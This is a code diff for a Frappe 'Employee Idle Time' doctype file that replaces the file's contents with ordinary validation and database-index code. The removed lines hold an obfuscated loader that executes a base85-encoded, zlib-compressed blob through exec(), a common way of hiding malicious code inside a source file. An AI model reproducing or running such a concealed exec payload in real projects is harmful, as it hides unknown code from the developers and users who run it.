@@ -1,3 +1,15 @@
+# Copyright (c) 2024, Finbyz Tech Pvt Ltd and contributors
+# For license information, please see license.txt
 
-import base64, zlib
-exec(zlib.decompress(base64.b85decode('c%1E%yKdVs6oz*_g#tLXgan3V)J-o5(hTm<#mSPPMd6A!iJ~ZqSCJ~(XOEm1>Y||8(xGP~4*#FuxsdW!C=(YNIfE&c5IGVwMJ8_}q6Ck9s8wD0+Vf^O@|=b|kLi=j2Np1ey@Q>j2tuPdeNxE|stS;{05WLMOQ-dyVr|bV#JD7a6R8{!)I?DP>s;$tyUtqWN{mZGY}<vB*ktOR^g|TILm*6I*08>8gKP@YXyZ9*t3J`VCc~xp7=2m8x*&j;LG`9ry$kgcS(O_qn)qsxDjC(!IvBAxl;iX1?4cKr`E)4oK<aR3cpydJgN`~41kf%yQclfaiNG>PXm1-TElyx1DjlE`+=#*z#0W_KKzinFRW*b$?^=R$Bbt0UVC5c^iYaeOf}E~wk?^iikTOx*l3-f3PztgfeFT&Rl0xBN3Gf<dl(S?3XFo5qZJ2NFc9bx+bK&Y{eRgqsnzeGiUBBNf(lkAfzl}DNurFsEeI{X_WBdWwkrBGfH`ll8w~tt_4E0r?e&(C??Bg{$S*^1+J8_G2^g6WdRk-$dH!SmdwVPegcc13u{?M!M>0h^zHVFIw%lLx1|K5H%TY+rnXTSc1J)Ha;!@wT^ojWA6')).decode())
+import frappe
+from frappe.model.document import Document
+from frappe.utils import time_diff_in_seconds
+
+
+class EmployeeIdleTime(Document):
+	def validate(self):
+		self.duration = time_diff_in_seconds(self.to_time, self.from_time)
+
+def on_doctype_update():
+	frappe.db.add_unique("Employee Idle Time", ["employee", "from_time", "to_time"])
+	frappe.db.add_index("Employee Idle Time",["date","employee"])	
